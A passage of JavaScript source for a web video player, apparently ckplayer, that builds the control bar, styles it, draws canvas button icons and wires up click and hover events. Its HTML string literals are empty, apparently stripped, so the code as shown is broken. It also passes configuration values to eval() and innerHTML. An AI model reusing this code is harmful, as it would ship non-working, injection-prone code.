this.getByElement(controlBarID).innerHTML = html; //构建进度条内容 this.getByElement(timeProgressBgID).innerHTML = ''; this.getByElement(timeBOBGID).innerHTML = ''; //构建进度条内容结束 this.getByElement(pauseCenterID).innerHTML = this.newCanvas(pauseCenterID, 80, 80); //构建中间暂停按钮 this.getByElement(loadingID).innerHTML = this.newCanvas(loadingID, 60, 60); //构建中间缓冲时显示的图标 this.getByElement(errorTextID).innerHTML = this.language['error']; //构建错误时显示的文本框 //构建广告相关 html = '' + this.language['adTime'].replace('{$second}', 0) + ''; html += '' + this.newCanvas(adMuteID, 30, 30) + ''; html += '' + this.newCanvas(adEscMuteID, 30, 30) + ''; html += ''; this.getByElement(adBarID).innerHTML = html; this.getByElement(adLinkID).innerHTML = this.language['adLink']; this.getByElement(adPauseCloseID).innerHTML = this.newCanvas(adPauseCloseID, 20, 20); if (this.ckplayerConfig['style']['logo']) { if (this.ckplayerConfig['style']['logo']['file']) { var logoFile = this.ckplayerConfig['style']['logo']['file']; if (logoFile.substr(0, 15) == 'data:image/png;' || logoFile.substr(0, 15) == 'data:image/jpg;' || logoFile.substr(0, 16) == 'data:image/jpeg;') { this.getByElement(logoID).innerHTML = ''; //构建logo } } } else { this.getByElement(logoID).innerHTML = this.vars['logo'] || this.logo || ''; //构建logo } var pd = this.PD; //CB:Object：全局变量，将一些全局需要用到的元素统一放在CB对象里 this.CB = { controlBarBg: this.getByElement(controlBarBgID, pd), controlBar: this.getByElement(controlBarID, pd), promptBg: this.getByElement(promptBgID, pd), prompt: this.getByElement(promptID, pd), timeProgressBg: this.getByElement(timeProgressBgID, pd), loadProgress: this.getByElement(loadProgressID, pd), timeProgress: this.getByElement(timeProgressID, pd), timeBoBg: this.getByElement(timeBOBGID, pd), timeButton: this.getByElement(timeBOID, pd), timeText: this.getByElement(timeTextID, pd), play: this.getByElement(playID, pd), front: this.getByElement(frontID, pd), next: this.getByElement(nextID, pd), pause: this.getByElement(pauseID, pd), definition: this.getByElement(definitionID, pd), definitionP: this.getByElement(definitionPID, pd), definitionLine: this.getByElement(dlineID + '-rb', pd), playbackrate: this.getByElement(playbackRateID, pd), playbackrateP: this.getByElement(playbackRatePID, pd), playbackrateLine: this.getByElement(dlineID + '-rc', pd), subtitles: this.getByElement(subtitlesID, pd), subtitlesP: this.getByElement(subtitlesPID, pd), subtitlesLine: this.getByElement(dlineID + '-rd', pd), full: this.getByElement(fullID, pd), escFull: this.getByElement(escFullID, pd), mute: this.getByElement(muteID, pd), escMute: this.getByElement(escMuteID, pd), volume: this.getByElement(volumeID, pd), volumeBg: this.getByElement(volumeBgID, pd), volumeUp: this.getByElement(volumeUpID, pd), volumeBO: this.getByElement(volumeBOID, pd), pauseCenter: this.getByElement(pauseCenterID, pd), menu: this.getByElement(menuID), loading: this.getByElement(loadingID, pd), loadingCanvas: this.getByElement(loadingID + '-canvas', pd), errorText: this.getByElement(errorTextID, pd), logo: this.getByElement(logoID, pd), playLine: this.getByElement(dlineID + '-la', pd), frontLine: this.getByElement(dlineID + '-lb', pd), nextLine: this.getByElement(dlineID + '-lc', pd), fullLine: this.getByElement(dlineID + '-ra'), muteLine: this.getByElement(dlineID + '-re', pd), adBackground: this.getByElement(adBackgroundID, pd), adElement: this.getByElement(adElementID, pd), adBar: this.getByElement(adBarID, pd), adSkip: this.getByElement(adSkipID, pd), adTime: this.getByElement(adTimeID, pd), adLink: this.getByElement(adLinkID, pd), adMute: this.getByElement(adMuteID, pd), adEscMute: this.getByElement(adEscMuteID, pd), adPauseClose: this.getByElement(adPauseCloseID, pd) }; this.buttonWidth = { play: bWidth, full: bWidth, front: bWidth, next: bWidth, mute: bWidth }; //定义界面元素的样式 //控制栏背景 this.css(controlBarBgID, { width: '100%', height: bHeight + 'px', backgroundColor: '#000000', position: 'absolute', bottom: '0px', filter: 'alpha(opacity:0.8)', opacity: '0.8', zIndex: '990' }); //控制栏容器 this.css(controlBarID, { width: '100%', height: bHeight + 'px', position: 'absolute', bottom: '0px', zIndex: '990' }); //中间暂停按钮 this.css(pauseCenterID, { width: '80px', height: '80px', borderRadius: '50%', position: 'absolute', display: 'none', cursor: 'pointer', zIndex: '996' }); //loading this.css(loadingID, { width: '60px', height: '60px', position: 'absolute', display: 'none', zIndex: '996' }); //出错文本框 this.css(errorTextID, { width: '120px', height: '30px', lineHeight: '30px', color: '#FFFFFF', fontSize: '14px', textAlign: 'center', position: 'absolute', display: 'none', zIndex: '101', cursor: 'default', zIndex: '996' }); //定义logo文字的样式 this.css(logoID, { height: '30px', lineHeight: '30px', color: '#FFFFFF', fontFamily: 'Arial', fontSize: '28px', textAlign: 'center', position: 'absolute', float: 'left', left: '-1000px', top: '20px', zIndex: '996', filter: 'alpha(opacity:0.8)', opacity: '0.8', cursor: 'default' }); this.css(this.CB['loadingCanvas'], { transform: 'rotate(0deg)', msTransform: 'rotate(0deg)', mozTransform: 'rotate(0deg)', webkitTransform: 'rotate(0deg)', oTransform: 'rotate(0deg)' }); //定义提示语的样式 this.css([promptBgID, promptID], { height: '30px', lineHeight: '30px', color: '#FFFFFF', fontSize: '14px', textAlign: 'center', position: 'absolute', borderRadius: '5px', paddingLeft: '5px', paddingRight: '5px', bottom: '0px', display: 'none', zIndex: '995' }); this.css(promptBgID, { backgroundColor: '#000000', filter: 'alpha(opacity:0.5)', opacity: '0.5' }); //时间进度条背景容器 this.css(timeProgressBgID, { width: '100%', height: '6px', backgroundColor: '#3F3F3F', overflow: 'hidden', position: 'absolute', bottom: '38px', zIndex: '888' }); //加载进度和时间进度 this.css([loadProgressID, timeProgressID], { width: '1px', height: '6px', position: 'absolute', bottom: '38px', top: '0px', zIndex: '991' }); this.css(loadProgressID, 'backgroundColor', '#6F6F6F'); this.css(timeProgressID, 'backgroundColor', bOverColor); //时间进度按钮 this.css(timeBOBGID, { width: '100%', height: '14px', overflow: 'hidden', position: 'absolute', bottom: '34px', cursor: 'pointer', zIndex: '992' }); this.css(timeBOID, { width: '14px', height: '14px', overflow: 'hidden', borderRadius: '50%', backgroundColor: bBgColor, cursor: 'pointer', position: 'absolute', top: '0px', zIndex: '200' }); this.css(timeBWID, { width: '8px', height: '8px', overflow: 'hidden', borderRadius: '50%', position: 'absolute', backgroundColor: bOverColor, left: '3px', top: '3px' }); this.css(timeTextID, { lineHeight: bHeight + 'px', color: '#FFFFFF', fontFamily: 'arial', fontSize: '16px', paddingLeft: '10px', float: 'left', overflow: 'hidden', cursor: 'default' }); //分隔线 this.css([dlineID + '-la', dlineID + '-lb', dlineID + '-lc', dlineID + '-ra', dlineID + '-rb', dlineID + '-rc', dlineID + '-rd', dlineID + '-re'], { width: '0px', height: bHeight + 'px', overflow: 'hidden', borderLeft: '1px solid #303030', borderRight: '1px solid #151515', filter: 'alpha(opacity:0.9)', opacity: '0.9' }); this.css([dlineID + '-la', dlineID + '-lb', dlineID + '-lc'], 'float', 'left'); this.css([dlineID + '-ra', dlineID + '-rb', dlineID + '-rc', dlineID + '-rd', dlineID + '-re'], 'float', 'right'); this.css([dlineID + '-lb', dlineID + '-lc', dlineID + '-rb', dlineID + '-rc', dlineID + '-rd'], 'display', 'none'); //播放/暂停/上一集/下一集按钮 this.css([playID, pauseID, frontID, nextID], { width: bWidth + 'px', height: bHeight + 'px', float: 'left', overflow: 'hidden', cursor: 'pointer' }); this.css([frontID, nextID], 'display', 'none'); //初始化判断播放/暂停按钮隐藏项 this.initPlayPause(); //设置静音/取消静音的按钮样式 this.css([muteID, escMuteID], { width: bWidth + 'px', height: bHeight + 'px', float: 'right', overflow: 'hidden', cursor: 'pointer' }); if (this.vars['volume'] > 0) { this.css(escMuteID, 'display', 'none'); } else { this.css(muteID, 'display', 'none'); } if (!this.ckplayerConfig['config']['mobileVolumeBarShow'] && this.isMobile()) { this.css([muteID, escMuteID, volumeID, volumeDbgID, dlineID + '-re'], { display: 'none' }); } //音量调节框 this.css([volumeID, volumeDbgID], { width: '70px', height: bHeight + 'px', overflow: 'hidden', float: 'right' }); this.css(volumeDbgID, { position: 'absolute' }); this.css([volumeBgID, volumeUpID], { width: '60px', height: '6px', overflow: 'hidden', borderRadius: '5px', cursor: 'pointer' }); this.css(volumeBgID, { position: 'absolute', top: '16px' }); this.css(volumeBgID, 'backgroundColor', '#666666'); this.css(volumeUpID, 'backgroundColor', bOverColor); this.buttonWidth['volume'] = 100; //音量调节按钮 this.css(volumeBOID, { width: '12px', height: '12px', overflow: 'hidden', borderRadius: '50%', position: 'absolute', backgroundColor: bBgColor, top: '13px', left: '0px', cursor: 'pointer' }); this.css(volumeBWID, { width: '6px', height: '6px', overflow: 'hidden', borderRadius: '50%', position: 'absolute', backgroundColor: bOverColor, left: '3px', top: '3px' }); //清晰度容器 this.css(definitionID, { lineHeight: bHeight + 'px', color: '#FFFFFF', float: 'right', fontSize: '14px', textAlign: 'center', overflow: 'hidden', display: 'none', cursor: 'pointer' }); this.css(definitionPID, { lineHeight: (bHeight - 8) + 'px', color: '#FFFFFF', overflow: 'hidden', position: 'absolute', bottom: '4px', backgroundColor: '#000000', textAlign: 'center', zIndex: '995', cursor: 'pointer', display: 'none' }); //倍速容器 this.css(playbackRateID, { lineHeight: bHeight + 'px', color: '#FFFFFF', float: 'right', fontSize: '14px', textAlign: 'center', overflow: 'hidden', display: 'none', cursor: 'pointer' }); this.css(playbackRatePID, { lineHeight: (bHeight - 8) + 'px', color: '#FFFFFF', overflow: 'hidden', position: 'absolute', bottom: '4px', backgroundColor: '#000000', textAlign: 'center', zIndex: '995', cursor: 'pointer', display: 'none' }); //字幕容器 this.css(subtitlesID, { lineHeight: bHeight + 'px', color: '#FFFFFF', float: 'right', fontSize: '14px', textAlign: 'center', overflow: 'hidden', display: 'none', cursor: 'pointer' }); this.css(subtitlesPID, { lineHeight: (bHeight - 8) + 'px', color: '#FFFFFF', overflow: 'hidden', position: 'absolute', bottom: '4px', backgroundColor: '#000000', textAlign: 'center', zIndex: '995', cursor: 'pointer', display: 'none' }); //设置全屏/退出全屏按钮样式 this.css([fullID, escFullID], { width: bWidth + 'px', height: bHeight + 'px', float: 'right', overflow: 'hidden', cursor: 'pointer' }); this.css(escFullID, 'display', 'none'); //设置广告背景层样式 this.css(adBackgroundID, { width: '100%', height: '100%', backgroundColor: '#000000', position: 'absolute', top: '0px', zIndex: '997', display: 'none' }); this.css(adElementID, { position: 'absolute', overflow: 'hidden', top: '0px', zIndex: '998', float: 'center', display: 'none' }); this.css(adBarID, { position: 'absolute', overflow: 'hidden', top: '10px', right: '10px', zIndex: '999', textAlign: 'right', display: 'none' }); this.css(adTimeID, { backgroundColor: '#000000', color: '#FF0000', paddingLeft: '10px', paddingRight: '10px', lineHeight: (bHeight - 8) + 'px', marginLeft: '5px', float: 'right', cursor: 'pointer' }); this.css([adMuteID, adEscMuteID], { backgroundColor: '#000000', width: '30px', height: '30px', marginLeft: '5px', float: 'right', display: 'none', cursor: 'pointer' }); this.css(adSkipID, { backgroundColor: '#000000', lineHeight: (bHeight - 8) + 'px', color: '#FFFFFF', paddingLeft: '10px', paddingRight: '10px', float: 'right', display: 'none', cursor: 'pointer' }); this.css(adLinkID, { backgroundColor: '#ea5503', lineHeight: (bHeight - 8) + 'px', color: '#FFFFFF', paddingLeft: '10px', paddingRight: '10px', position: 'absolute', overflow: 'hidden', bottom: '10px', right: '10px', zIndex: '999', display: 'none' }); this.css(adPauseCloseID, { backgroundColor: '#f7f7f7', //f8f7f7 widht: '20px', height: '20px', position: 'absolute', overflow: 'hidden', zIndex: '999', top: '60px', left: '30px', borderRadius: '20px', display: 'none', cursor: 'pointer' }); //构建各按钮的形状 //播放按钮 var cPlay = this.getByElement(playID + '-canvas').getContext('2d'); var cPlayFillRect = function() { thisTemp.canvasFill(cPlay, [[12, 10], [29, 19], [12, 28]]); }; cPlay.fillStyle = bBgColor; cPlayFillRect(); var cPlayOver = function(event) { cPlay.clearRect(0, 0, bWidth, bHeight); cPlay.fillStyle = bOverColor; cPlayFillRect(); }; var cPlayOut = function(event) { cPlay.clearRect(0, 0, bWidth, bHeight); cPlay.fillStyle = bBgColor; cPlayFillRect(); }; this.addListenerInside('mouseover', cPlayOver, this.getByElement(playID + '-canvas')); this.addListenerInside('mouseout', cPlayOut, this.getByElement(playID + '-canvas')); //暂停按钮 var cPause = this.getByElement(pauseID + '-canvas').getContext('2d'); var cPauseFillRect = function() { thisTemp.canvasFillRect(cPause, [[10, 10, 5, 18], [22, 10, 5, 18]]); }; cPause.fillStyle = bBgColor; cPauseFillRect(); var cPauseOver = function(event) { cPause.clearRect(0, 0, bWidth, bHeight); cPause.fillStyle = bOverColor; cPauseFillRect(); }; var cPauseOut = function(event) { cPause.clearRect(0, 0, bWidth, bHeight); cPause.fillStyle = bBgColor; cPauseFillRect(); }; this.addListenerInside('mouseover', cPauseOver, this.getByElement(pauseID + '-canvas')); this.addListenerInside('mouseout', cPauseOut, this.getByElement(pauseID + '-canvas')); //前一集按钮 var cFront = this.getByElement(frontID + '-canvas').getContext('2d'); var cFrontFillRect = function() { thisTemp.canvasFill(cFront, [[16, 19], [30, 10], [30, 28]]); thisTemp.canvasFillRect(cFront, [[8, 10, 5, 18]]); }; cFront.fillStyle = bBgColor; cFrontFillRect(); var cFrontOver = function(event) { cFront.clearRect(0, 0, bWidth, bHeight); cFront.fillStyle = bOverColor; cFrontFillRect(); }; var cFrontOut = function(event) { cFront.clearRect(0, 0, bWidth, bHeight); cFront.fillStyle = bBgColor; cFrontFillRect(); }; this.addListenerInside('mouseover', cFrontOver, this.getByElement(frontID + '-canvas')); this.addListenerInside('mouseout', cFrontOut, this.getByElement(frontID + '-canvas')); //下一集按钮 var cNext = this.getByElement(nextID + '-canvas').getContext('2d'); var cNextFillRect = function() { thisTemp.canvasFill(cNext, [[8, 10], [22, 19], [8, 28]]); thisTemp.canvasFillRect(cNext, [[25, 10, 5, 18]]); }; cNext.fillStyle = bBgColor; cNextFillRect(); var cNextOver = function(event) { cNext.clearRect(0, 0, bWidth, bHeight); cNext.fillStyle = bOverColor; cNextFillRect(); }; var cNextOut = function(event) { cNext.clearRect(0, 0, bWidth, bHeight); cNext.fillStyle = bBgColor; cNextFillRect(); }; this.addListenerInside('mouseover', cNextOver, this.getByElement(nextID + '-canvas')); this.addListenerInside('mouseout', cNextOut, this.getByElement(nextID + '-canvas')); //全屏按钮 var cFull = this.getByElement(fullID + '-canvas').getContext('2d'); var cFullFillRect = function() { thisTemp.canvasFillRect(cFull, [[19, 10, 9, 3], [25, 13, 3, 6], [10, 19, 3, 9], [13, 25, 6, 3]]); }; cFull.fillStyle = bBgColor; cFullFillRect(); var cFullOver = function() { cFull.clearRect(0, 0, bWidth, bHeight); cFull.fillStyle = bOverColor; cFullFillRect(); }; var cFullOut = function() { cFull.clearRect(0, 0, bWidth, bHeight); cFull.fillStyle = bBgColor; cFullFillRect(); }; this.addListenerInside('mouseover', cFullOver, this.getByElement(fullID + '-canvas')); this.addListenerInside('mouseout', cFullOut, this.getByElement(fullID + '-canvas')); //定义退出全屏按钮样式 var cEscFull = this.getByElement(escFullID + '-canvas').getContext('2d'); var cEscFullFillRect = function() { thisTemp.canvasFillRect(cEscFull, [[20, 9, 3, 9], [23, 15, 6, 3], [9, 20, 9, 3], [15, 23, 3, 6]]); }; cEscFull.fillStyle = bBgColor; cEscFullFillRect(); var cEscFullOver = function() { cEscFull.clearRect(0, 0, bWidth, bHeight); cEscFull.fillStyle = bOverColor; cEscFullFillRect(); }; var cEscFullOut = function() { cEscFull.clearRect(0, 0, bWidth, bHeight); cEscFull.fillStyle = bBgColor; cEscFullFillRect(); }; this.addListenerInside('mouseover', cEscFullOver, this.getByElement(escFullID + '-canvas')); this.addListenerInside('mouseout', cEscFullOut, this.getByElement(escFullID + '-canvas')); //定义静音按钮的样式 var cMute = this.getByElement(muteID + '-canvas').getContext('2d'); var cMuteFillRect = function() { thisTemp.canvasFill(cMute, [[10, 15], [15, 15], [21, 10], [21, 28], [15, 23], [10, 23]]); thisTemp.canvasFillRect(cMute, [[23, 15, 2, 8], [27, 10, 2, 18]]); }; cMute.fillStyle = bBgColor; cMuteFillRect(); var cMuteOver = function() { cMute.clearRect(0, 0, bWidth, bHeight); cMute.fillStyle = bOverColor; cMuteFillRect(); }; var cMuteOut = function() { cMute.clearRect(0, 0, bWidth, bHeight); cMute.fillStyle = bBgColor; cMuteFillRect(); }; this.addListenerInside('mouseover', cMuteOver, this.getByElement(muteID + '-canvas')); this.addListenerInside('mouseout', cMuteOut, this.getByElement(muteID + '-canvas')); //定义取消广告静音按钮样式 var cEscMute = this.getByElement(escMuteID + '-canvas').getContext('2d'); var cEscMuteFillRect = function() { thisTemp.canvasFill(cEscMute, [[10, 15], [15, 15], [21, 10], [21, 28], [15, 23], [10, 23]]); thisTemp.canvasFill(cEscMute, [[23, 13], [24, 13], [33, 25], [32, 25]]); thisTemp.canvasFill(cEscMute, [[32, 13], [33, 13], [24, 25], [23, 25]]); }; cEscMute.fillStyle = bBgColor; cEscMuteFillRect(); var cEscMuteOver = function() { cEscMute.clearRect(0, 0, bWidth, bHeight); cEscMute.fillStyle = bOverColor; cEscMuteFillRect(); }; var cEscMuteOut = function() { cEscMute.clearRect(0, 0, bWidth, bHeight); cEscMute.fillStyle = bBgColor; cEscMuteFillRect(); }; this.addListenerInside('mouseover', cEscMuteOver, this.getByElement(escMuteID + '-canvas')); this.addListenerInside('mouseout', cEscMuteOut, this.getByElement(escMuteID + '-canvas')); //定义广告静音按钮的样式 var cAdMute = this.getByElement(adMuteID + '-canvas').getContext('2d'); var cAdMuteFillRect = function() { thisTemp.canvasFill(cAdMute, [[8, 12], [12, 12], [16, 8], [16, 21], [12, 18], [8, 18]]); thisTemp.canvasFillRect(cAdMute, [[18, 12, 2, 6], [21, 8, 2, 14]]); }; cAdMute.fillStyle = bBgColor; cAdMuteFillRect(); var cAdMuteOver = function() { cAdMute.clearRect(0, 0, bWidth, bHeight); cAdMute.fillStyle = bOverColor; cAdMuteFillRect(); }; var cAdMuteOut = function() { cAdMute.clearRect(0, 0, bWidth, bHeight); cAdMute.fillStyle = bBgColor; cAdMuteFillRect(); }; this.addListenerInside('mouseover', cAdMuteOver, this.getByElement(adMuteID + '-canvas')); this.addListenerInside('mouseout', cAdMuteOut, this.getByElement(adMuteID + '-canvas')); //定义取消静音广告按钮样式 var cAdEscMute = this.getByElement(adEscMuteID + '-canvas').getContext('2d'); var cAdEscMuteFillRect = function() { thisTemp.canvasFill(cAdEscMute, [[8, 12], [12, 12], [16, 8], [16, 21], [12, 18], [8, 18]]); thisTemp.canvasFill(cAdEscMute, [[18, 10], [20, 10], [26, 20], [24, 20]]); thisTemp.canvasFill(cAdEscMute, [[25, 10], [27, 10], [20, 20], [18, 20]]); }; cAdEscMute.fillStyle = bBgColor; cAdEscMuteFillRect(); var cAdEscMuteOver = function() { cAdEscMute.clearRect(0, 0, bWidth, bHeight); cAdEscMute.fillStyle = bOverColor; cAdEscMuteFillRect(); }; var cAdEscMuteOut = function() { cAdEscMute.clearRect(0, 0, bWidth, bHeight); cAdEscMute.fillStyle = bBgColor; cAdEscMuteFillRect(); }; this.addListenerInside('mouseover', cAdEscMuteOver, this.getByElement(adEscMuteID + '-canvas')); this.addListenerInside('mouseout', cAdEscMuteOut, this.getByElement(adEscMuteID + '-canvas')); //定义暂停广告关闭按钮 var adPauseClose = this.getByElement(adPauseCloseID + '-canvas').getContext('2d'); var adPauseCloseFillRect = function() { thisTemp.canvasFill(adPauseClose, [[4, 6], [6, 6], [16, 15], [14, 15]]); thisTemp.canvasFill(adPauseClose, [[14, 6], [16, 6], [6, 15], [4, 15]]); }; adPauseClose.fillStyle = '#404856'; adPauseCloseFillRect(); var adPauseCloseOver = function() { adPauseClose.clearRect(0, 0, bWidth, bHeight); adPauseClose.fillStyle = bOverColor; adPauseCloseFillRect(); }; var adPauseCloseOut = function() { adPauseClose.clearRect(0, 0, bWidth, bHeight); adPauseClose.fillStyle = '#404856'; adPauseCloseFillRect(); }; this.addListenerInside('mouseover', adPauseCloseOver, this.getByElement(adPauseCloseID + '-canvas')); this.addListenerInside('mouseout', adPauseCloseOut, this.getByElement(adPauseCloseID + '-canvas')); //定义loading样式 var cLoading = this.getByElement(loadingID + '-canvas').getContext('2d'); var cLoadingFillRect = function() { cLoading.save(); var grad = cLoading.createLinearGradient(0, 0, 60, 60); grad.addColorStop(0, bBgColor); var grad2 = cLoading.createLinearGradient(0, 0, 80, 60); grad2.addColorStop(1, bOverColor); var grad3 = cLoading.createLinearGradient(0, 0, 80, 60); grad3.addColorStop(1, '#FF9900'); var grad4 = cLoading.createLinearGradient(0, 0, 80, 60); grad4.addColorStop(1, '#CC3300'); cLoading.strokeStyle = grad; //设置描边样式 cLoading.lineWidth = 8; //设置线宽 cLoading.beginPath(); //路径开始 cLoading.arc(30, 30, 25, 0, 0.4 * Math.PI, false); //用于绘制圆弧context.arc(x坐标，y坐标，半径，起始角度，终止角度，顺时针/逆时针) cLoading.stroke(); //绘制 cLoading.closePath(); //路径结束 cLoading.beginPath(); //路径开始 cLoading.strokeStyle = grad2; //设置描边样式 cLoading.arc(30, 30, 25, 0.5 * Math.PI, 0.9 * Math.PI, false); //用于绘制圆弧context.arc(x坐标，y坐标，半径，起始角度，终止角度，顺时针/逆时针) cLoading.stroke(); //绘制 cLoading.beginPath(); //路径开始 cLoading.strokeStyle = grad3; //设置描边样式 cLoading.arc(30, 30, 25, Math.PI, 1.4 * Math.PI, false); //用于绘制圆弧context.arc(x坐标，y坐标，半径，起始角度，终止角度，顺时针/逆时针) cLoading.stroke(); //绘制 cLoading.beginPath(); //路径开始 cLoading.strokeStyle = grad4; //设置描边样式 cLoading.arc(30, 30, 25, 1.5 * Math.PI, 1.9 * Math.PI, false); //用于绘制圆弧context.arc(x坐标，y坐标，半径，起始角度，终止角度，顺时针/逆时针) cLoading.stroke(); //绘制 cLoading.closePath(); //路径结束 cLoading.restore(); }; cLoading.fillStyle = bBgColor; cLoadingFillRect(); //定义中间暂停按钮的样式 var cPauseCenter = this.getByElement(pauseCenterID + '-canvas').getContext('2d'); var cPauseCenterFillRect = function() { thisTemp.canvasFill(cPauseCenter, [[28, 22], [59, 38], [28, 58]]); /* 指定几个颜色 */ cPauseCenter.save(); cPauseCenter.lineWidth = 5; //设置线宽 cPauseCenter.beginPath(); //路径开始 cPauseCenter.arc(40, 40, 35, 0, 2 * Math.PI, false); //用于绘制圆弧context.arc(x坐标，y坐标，半径，起始角度，终止角度，顺时针/逆时针) cPauseCenter.stroke(); //绘制 cPauseCenter.closePath(); //路径结束 cPauseCenter.restore(); }; cPauseCenter.fillStyle = bBgColor; cPauseCenter.strokeStyle = bBgColor; cPauseCenterFillRect(); var cPauseCenterOver = function() { cPauseCenter.clearRect(0, 0, 80, 80); cPauseCenter.fillStyle = bOverColor; cPauseCenter.strokeStyle = bOverColor; cPauseCenterFillRect(); }; var cPauseCenterOut = function() { cPauseCenter.clearRect(0, 0, 80, 80); cPauseCenter.fillStyle = bBgColor; cPauseCenter.strokeStyle = bBgColor; cPauseCenterFillRect(); }; this.addListenerInside('mouseover', cPauseCenterOver, this.getByElement(pauseCenterID + '-canvas')); this.addListenerInside('mouseout', cPauseCenterOut, this.getByElement(pauseCenterID + '-canvas')); //鼠标经过/离开音量调节按钮 var volumeBOOver = function() { thisTemp.css(volumeBOID, 'backgroundColor', bOverColor); thisTemp.css(volumeBWID, 'backgroundColor', bBgColor); }; var volumeBOOut = function() { thisTemp.css(volumeBOID, 'backgroundColor', bBgColor); thisTemp.css(volumeBWID, 'backgroundColor', bOverColor); }; this.addListenerInside('mouseover', volumeBOOver, this.getByElement(volumeBOID)); this.addListenerInside('mouseout', volumeBOOut, this.getByElement(volumeBOID)); //鼠标经过/离开进度按钮 var timeBOOver = function() { thisTemp.css(timeBOID, 'backgroundColor', bOverColor); thisTemp.css(timeBWID, 'backgroundColor', bBgColor); }; var timeBOOut = function() { thisTemp.css(timeBOID, 'backgroundColor', bBgColor); thisTemp.css(timeBWID, 'backgroundColor', bOverColor); }; this.addListenerInside('mouseover', timeBOOver, this.getByElement(timeBOID)); this.addListenerInside('mouseout', timeBOOut, this.getByElement(timeBOID)); this.addButtonEvent(); //注册按钮及音量调节，进度操作事件 this.newMenu(); //单独设置右键的样式和事件 this.controlBarHide(); //单独注册控制栏隐藏事件 this.keypress(); //单独注册键盘事件 //初始化音量调节框 this.changeVolume(this.vars['volume']); //初始化判断是否需要显示上一集和下一集按钮 this.showFrontNext(); setTimeout(function() { thisTemp.elementCoordinate(); //调整中间暂停按钮/loading的位置/error的位置 }, 100); this.checkBarWidth(); var resize = function() { thisTemp.elementCoordinate(); thisTemp.timeUpdateHandler(); thisTemp.changeLoad(); thisTemp.checkBarWidth(); thisTemp.changeElementCoor(); //修改新加元件的坐标 thisTemp.changePrompt(); thisTemp.adPauseCoor(); thisTemp.adOtherCoor(); }; this.addListenerInside('resize', resize, window); }, /* 内部函数 创建按钮，使用canvas画布 */ newCanvas: function(id, width, height) { return ''; }, /* 内部函数 注册按钮，音量调节框，进度操作框事件 */ addButtonEvent: function() { var thisTemp = this; //定义按钮的单击事件 var playClick = function(event) { thisTemp.videoPlay(); thisTemp.sendJS('clickEvent', 'actionScript->videoPlay'); }; this.addListenerInside('click', playClick, this.CB['play']); this.addListenerInside('click', playClick, this.CB['pauseCenter']); var pauseClick = function(event) { thisTemp.videoPause(); thisTemp.sendJS('clickEvent', 'actionScript->videoPause'); }; this.addListenerInside('click', pauseClick, this.CB['pause']); var frontClick = function(event) { if (thisTemp.vars['front']) { eval(thisTemp.vars['front'] + '()'); thisTemp.sendJS('clickEvent', 'actionScript->' + thisTemp.vars['front']); } }; this.addListenerInside('click', frontClick, this.CB['front']); var nextClick = function(event) { if (thisTemp.vars['next']) { eval(thisTemp.vars['next'] + '()'); thisTemp.sendJS('clickEvent', 'actionScript->' + thisTemp.vars['next']); } }; this.addListenerInside('click', nextClick, this.CB['next']); var muteClick = function(event) { thisTemp.videoMute(); thisTemp.sendJS('clickEvent', 'actionScript->videoMute'); }; this.addListenerInside('click', muteClick, this.CB['mute']); var escMuteClick = function(event) { thisTemp.videoEscMute(); thisTemp.sendJS('clickEvent', 'actionScript->videoEscMute'); }; this.addListenerInside('click', escMuteClick, this.CB['escMute']); var fullClick = function(event) { thisTemp.fullScreen(); thisTemp.sendJS('clickEvent', 'actionScript->fullScreen'); }; this.addListenerInside('click', fullClick, this.CB['full']); var escFullClick = function(event) { thisTemp.quitFullScreen(); thisTemp.sendJS('clickEvent', 'actionScript->quitFullScreen'); }; this.addListenerInside('click', escFullClick, this.CB['escFull']); var adSkipClick = function(event) { if (thisTemp.CB['adSkip'].innerHTML == thisTemp.language['skipAd']) { thisTemp.runFunction(thisTemp.config['adSkipClick']); } }; this.addListenerInside('click', adSkipClick, this.CB['adSkip']); var adMuteClick = function(event) { thisTemp.adMuteFunction(); }; this.addListenerInside('click', adMuteClick, this.CB['adMute']); var adEscMuteClick = function(event) { thisTemp.adEscMuteFunction(); }; this.addListenerInside('click', adEscMuteClick, this.CB['adEscMute']); var adPauseCloseClick = function(event) { thisTemp.adPauseCloseFunction(); }; this.addListenerInside('click', adPauseCloseClick, this.CB['adPauseClose']); //定义各个按钮的鼠标经过/离开事件 var promptHide = function(event) { thisTemp.promptShow(false); }; var playOver = function(event) { thisTemp.promptShow(thisTemp.CB['play']); }; this.addListenerInside('mouseover', playOver, this.CB['play']); this.addListenerInside('mouseout', promptHide, this.CB['play']); var pauseOver = function(event) { thisTemp.promptShow(thisTemp.CB['pause']); }; this.addListenerInside('mouseover', pauseOver, this.CB['pause']); this.addListenerInside('mouseout', promptHide, this.CB['pause']); var frontOver = function(event) { thisTemp.promptShow(thisTemp.CB['front']); }; this.addListenerInside('mouseover', frontOver, this.CB['front']); this.addListenerInside('mouseout', promptHide, this.CB['front']); var nextOver = function(event) { thisTemp.promptShow(thisTemp.CB['next']); }; this.addListenerInside('mouseover', nextOver, this.CB['next']); this.addListenerInside('mouseout', promptHide, this.CB['next']); var muteOver = function(event) { thisTemp.promptShow(thisTemp.CB['mute']); }; this.addListenerInside('mouseover', muteOver, this.CB['mute']); this.addListenerInside('mouseout', promptHide, this.CB['mute']); var escMuteOver = function(event) { thisTemp.promptShow(thisTemp.CB['escMute']); }; this.addListenerInside('mouseover', escMuteOver, this.CB['escMute']); this.addListenerInside('mouseout', promptHide, this.CB['escMute']); var fullOver = function(event) { thisTemp.promptShow(thisTemp.CB['full']); }; this.addListenerInside('mouseover', fullOver, this.CB['full']); this.addListenerInside('mouseout', promptHide, this.CB['full']); var escFullOver = function(event) { thisTemp.promptShow(thisTemp.CB['escFull']); }; this.addListenerInside('mouseover', escFullOver, this.CB['escFull']); this.addListenerInside('mouseout', promptHide, this.CB['escFull']); var definitionOver = function(event) { thisTemp.promptShow(thisTemp.CB['definition']); }; this.addListenerInside('mouseover', definitionOver, this.CB['definition']); this.addListenerInside('mouseout', promptHide, this.CB['definition']); var playbackrateOver = function(event) { thisTemp.promptShow(thisTemp.CB['playbackrate']); }; this.addListenerInside('mouseover', playbackrateOver, this.CB['playbackrate']); this.addListenerInside('mouseout', promptHide, this.CB['playbackrate']); var subtitlesOver = function(event) { thisTemp.promptShow(thisTemp.CB['subtitles']); }; this.addListenerInside('mouseover', subtitlesOver, this.CB['subtitles']); this.addListenerInside('mouseout', promptHide, this.CB['subtitles']); //定义音量和进度按钮的滑块事件 var volumePrompt = function(vol) { var volumeBOXY = thisTemp.getCoor(thisTemp.CB['volumeBO']); var promptObj = { title: thisTemp.language['volume'] + vol + '%', x: volumeBOXY['x'] + thisTemp.CB['volumeBO'].offsetWidth * 0.5, y: 